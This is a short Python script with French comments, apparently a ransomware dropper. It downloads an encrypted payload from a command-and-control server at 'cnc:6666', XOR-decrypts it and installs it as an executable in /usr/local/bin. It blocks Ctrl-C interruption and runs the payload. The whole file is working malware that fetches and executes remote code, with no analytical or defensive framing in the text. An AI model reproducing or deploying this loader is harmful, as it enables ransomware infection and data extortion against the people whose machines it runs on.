import base64
import os
import requests
import subprocess
import sys
from pathlib import Path

from xorcrypt import xorcrypt
import signal

CNC_ADDRESS = "cnc:6666"  
OUTPUT_PATH = "/usr/local/bin/ransomware"  # Chemin d'installation pour le ransomware

def fetch_from_cnc(endpoint):
    """Télécharge les données encodées du CNC."""
    url = f"http://{CNC_ADDRESS}/{endpoint}"
    response = requests.get(url)
    if response.status_code == 200:
        return response.json()
    else:
        print(f"Erreur lors de la récupération des données depuis {endpoint}")
        sys.exit(1)

def decode_and_save(data, key, path):
    """Décode les données base64, les déchiffre et les enregistre dans le chemin donné."""
    decoded_data = base64.b64decode(data)
    decoded_key = base64.b64decode(key)
    decrypted_data = xorcrypt(decoded_data, decoded_key)

    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "wb") as f:
        f.write(decrypted_data)
    os.chmod(path, 0o755)  # Rendre le fichier exécutable

def main():
    # Désactiver SIGINT pour éviter les interruptions
    signal.signal(signal.SIGINT, signal.SIG_IGN)

    # Télécharger et installer le ransomware depuis le CNC s'il n'existe pas déjà
    if not os.path.exists(OUTPUT_PATH):
        cnc_data = fetch_from_cnc("ransomware")
        decode_and_save(cnc_data["data"], cnc_data["key"], OUTPUT_PATH)
        print("Ransomware téléchargé et installé avec succès.")

    # Exécuter le ransomware installé
    subprocess.run([OUTPUT_PATH])

if __name__ == "__main__":
    main()
